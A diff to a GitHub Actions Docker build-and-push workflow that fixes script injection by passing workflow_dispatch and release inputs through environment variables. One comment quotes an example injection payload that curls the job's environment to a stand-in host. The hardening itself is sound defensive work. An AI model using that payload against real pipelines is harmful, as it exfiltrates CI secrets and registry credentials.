@@ -23,14 +23,28 @@ jobs:
   docker:
     name: Build & push image
     runs-on: ubuntu-latest
+    # Insurance against a hung buildx/registry call. The full flow
+    # (clone + build + push + tag resolution + idempotency check)
+    # should finish well under this; 15 min is the action default.
+    timeout-minutes: 15
     steps:
       - name: Resolve event inputs
         id: inputs
         env:
+          # Thread ALL untrusted inputs through env vars rather than
+          # interpolating them into `run:` shell directly. This is the
+          # standard GitHub-Actions mitigation for script injection:
+          # `${{ inputs.X }}` would let a malicious caller (anyone with
+          # workflow_dispatch rights) break out of the string with
+          # `"; curl evil.example --data "$(env)"; echo "` and run
+          # arbitrary shell in a job that holds packages: write and
+          # ghcr.io credentials.
           EVENT_NAME: ${{ github.event_name }}
           RELEASE_TAG_NAME: ${{ github.event.release.tag_name }}
           RELEASE_TARGET_COMMITISH: ${{ github.event.release.target_commitish }}
           RELEASE_PRERELEASE: ${{ github.event.release.prerelease }}
+          DISPATCH_TAG_NAME: ${{ inputs.tag_name }}
+          DISPATCH_SOURCE_BRANCH: ${{ inputs.source_branch }}
         run: |
           set -euo pipefail
           if [ "$EVENT_NAME" = "release" ]; then
@@ -50,14 +64,20 @@ jobs:
               echo "on_main=$ON_MAIN"
             } >> "$GITHUB_OUTPUT"
           else
-            if [ "${{ inputs.source_branch }}" = "main" ]; then
+            # workflow_dispatch: there is no GitHub-emitted prerelease
+            # flag, so we leave PRERELEASE_FLAG empty. The script
+            # (`scripts/resolve-docker-tags.mjs`) interprets an empty /
+            # missing `--prerelease` as "derive from the tag's semver",
+            # which means a re-publish of `v1.0.0-rc.1` will NOT push
+            # `latest` even if source_branch=main.
+            if [ "$DISPATCH_SOURCE_BRANCH" = "main" ]; then
               ON_MAIN="true"
             else
               ON_MAIN="false"
             fi
             {
-              echo "tag_name=${{ inputs.tag_name }}"
-              echo "prerelease=false"
+              echo "tag_name=$DISPATCH_TAG_NAME"
+              echo "prerelease="
               echo "on_main=$ON_MAIN"
             } >> "$GITHUB_OUTPUT"
           fi
@@ -88,12 +108,16 @@ jobs:
 
       - name: Resolve Docker tags
         id: tags
+        env:
+          TAG_NAME: ${{ steps.inputs.outputs.tag_name }}
+          PRERELEASE: ${{ steps.inputs.outputs.prerelease }}
+          ON_MAIN: ${{ steps.inputs.outputs.on_main }}
         run: |
           set -euo pipefail
           JSON=$(node scripts/resolve-docker-tags.mjs \
-            --tag-name="${{ steps.inputs.outputs.tag_name }}" \
-            --prerelease="${{ steps.inputs.outputs.prerelease }}" \
-            --on-main="${{ steps.inputs.outputs.on_main }}")
+            --tag-name="$TAG_NAME" \
+            --prerelease="$PRERELEASE" \
+            --on-main="$ON_MAIN")
           echo "Computed tags payload: $JSON"
 
           IMAGE_OWNER="${{ github.repository_owner }}"
@@ -137,6 +161,15 @@ jobs:
           # credential store the login-action populated. Exit 0 means the
           # manifest exists; non-zero means the tag is not in the
           # registry.
+          #
+          # Assumption: `docker/build-push-action` pushes all tags in a
+          # single call, so a successful push of `<version>` implies
+          # `<major>.<minor>` and `latest` are also live in the registry
+          # (same manifest). This is why inspecting just the primary
+          # version tag is enough to skip — if a partial push ever
+          # somehow lands (network blip mid-call), the next manual
+          # workflow_dispatch re-run with a different tag would be the
+          # recovery path, not this idempotency guard.
           if docker buildx imagetools inspect "$IMAGE" >/dev/null 2>&1; then
             echo "::notice::Image ${IMAGE} already published; skipping build/push (idempotent no-op)."
             echo "already_published=true" >> "$GITHUB_OUTPUT"
